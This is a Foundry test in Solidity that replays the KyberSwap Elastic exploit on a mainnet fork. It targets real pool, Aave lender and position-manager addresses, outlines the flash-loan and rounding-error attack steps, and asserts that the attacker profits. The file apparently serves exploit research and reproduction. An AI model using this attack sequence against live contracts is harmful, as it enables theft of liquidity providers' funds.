//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Exploiter} from "../../src/kyberElastic2023/KyberElastic.sol";
import {ForkUtils} from "../utils/ForkUtils.t.sol";

/**
 * @notice KyberSwap Elastic Exploit Test - March 2023
 * @dev Attack Steps:
 *      1. Flash loan 2000 WETH from Aave to fund the exploit
 *      2. Move tick range to position with zero liquidity for strategic positioning
 *      3. Add concentrated liquidity at current tick (111,310) with upper bound at same tick
 *      4. Remove partial liquidity to set up pool state for precision manipulation
 *      5. Execute precisely calculated swap to exploit rounding error - creates impossible state where price exceeds tick boundary but liquidity wasn't updated
 *      6. Swap opposite direction exploiting double liquidity bug - uses inflated liquidity for favorable rates
 *      7. Repay flash loan and extract remaining profit
 */

contract KyberElastic2023Exploit is Test, ForkUtils {
    // Contract addresses
    address public victimPool = 0xFd7B111AA83b9b6F547E617C7601EfD997F64703;
    address public lender = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    uint256 public flashloanAmount = 0x6c6b935b8bbd400000; // 2000e18
    address public positionManager = 0xe222fBE074A436145b255442D919E4E3A6c6a480;
    Exploiter public exploiter;

    // Chain details
    string public constant ATTACK_ID = "kyberElastic2023";
    uint256 constant BLOCK_NUMBER = 18_630_391; // one block before the attack happened

    function setUp() public {
        // Setup fork at one block before attack happened
        string memory rpcUrl = vm.envString("MAINNET_RPC_URL");
        setupFork(ATTACK_ID, rpcUrl, BLOCK_NUMBER - 1);
        selectFork(ATTACK_ID);

        // Deploy exploiter
        exploiter = new Exploiter(victimPool, lender, flashloanAmount, positionManager);
    }

    function testKyberElastic2023Exploit() public {
        uint256 token0BalanceBefore = exploiter.token0().balanceOf(address(exploiter));
        uint256 token1BalanceBefore = exploiter.token1().balanceOf(address(exploiter));
        console.log("token0BalanceBefore: %s", token0BalanceBefore);
        console.log("token1BalanceBefore: %s", token1BalanceBefore);

        exploiter.trigger();

        uint256 token0BalanceAfter = exploiter.token0().balanceOf(address(exploiter));
        uint256 token1BalanceAfter = exploiter.token1().balanceOf(address(exploiter));
        console.log("token0BalanceAfter: %s", token0BalanceAfter);
        console.log("token1BalanceAfter: %s", token1BalanceAfter);
        assertGt(token0BalanceAfter, token0BalanceBefore, "token0Balance should increase");
        assertGt(token1BalanceAfter, token1BalanceBefore, "token1Balance should increase");
    }
}
